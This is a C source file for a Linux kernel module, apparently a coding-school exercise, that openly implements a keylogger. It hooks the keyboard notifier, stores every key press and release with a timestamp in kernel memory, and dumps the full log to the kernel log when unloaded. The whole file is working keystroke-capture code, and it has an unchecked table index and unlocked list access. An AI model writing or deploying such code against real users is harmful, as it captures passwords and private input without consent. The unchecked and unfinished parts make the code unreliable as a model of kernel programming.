#include <linux/fs.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/miscdevice.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/printk.h>
#include <linux/slab.h>
#include <linux/timekeeping.h>
#include <linux/time.h>
#include <linux/uaccess.h>

#include "ft_key.h"

extern const struct s_key keys_table[];

LIST_HEAD(keystroke_list);

static ssize_t	my_read(struct file *file, char __user *out, size_t len, loff_t *off)
{
	return 0;
}

static const struct file_operations fops = {
	.owner = THIS_MODULE,
	.read = my_read,
};

static struct miscdevice device = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = "ft_keyboard",
	.fops = &fops,
};

static int	keyboard_event(struct notifier_block *nb, unsigned long action, void *data)
{
	struct keyboard_notifier_param	*param = data;
	struct timespec64		ts;
	struct s_keystroke		*stroke;

	stroke = kmalloc(sizeof(struct s_keystroke), GFP_ATOMIC);
	if (!stroke || action != KBD_KEYCODE)
		return kfree(stroke), NOTIFY_OK;
	memcpy(&(stroke->key), &(keys_table[param->value]), sizeof(struct s_key));
	ktime_get_real_ts64(&ts);
	time64_to_tm(ts.tv_sec, 0, &(stroke->tm));
	stroke->down = param->down;
	list_add_tail(&stroke->list, &keystroke_list);
	//kfree(stroke); ///// to remove later for fuck's sake
	return NOTIFY_OK;
}

static struct notifier_block	keyboard_nb = {
	.notifier_call = keyboard_event,
};

static int __init dni_init(void)
{
	int	ret;

	pr_info("hi from the 42 keylogger\n");
	ret = misc_register(&device);
	if (ret) {
		pr_err("Failed to register misc device\n");
		return ret;
	}
	register_keyboard_notifier(&keyboard_nb);
	return 0;
}

static void	cleanup_logs(void)
{
	struct s_keystroke	*cursor, *tmp;

	list_for_each_entry_safe(cursor, tmp, &keystroke_list, list) {
		list_del(&cursor->list);
		kfree(cursor);
	}
}

static void __exit dni_exit(void)
{
	struct s_keystroke	*cursor;

	misc_deregister(&device);
	unregister_keyboard_notifier(&keyboard_nb);
	list_for_each_entry(cursor, &keystroke_list, list) {
		pr_info("%02d:%02d:%02d %s (%llu) %s\n",
			cursor->tm.tm_hour, cursor->tm.tm_min, cursor->tm.tm_sec,
			cursor->key.name, cursor->key.keycode, cursor->down ? "pressed" : "released");
	}
	cleanup_logs();
	pr_info("bye from the 42 keylogger\n");
}

module_init(dni_init);
module_exit(dni_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("a simple keylogger");
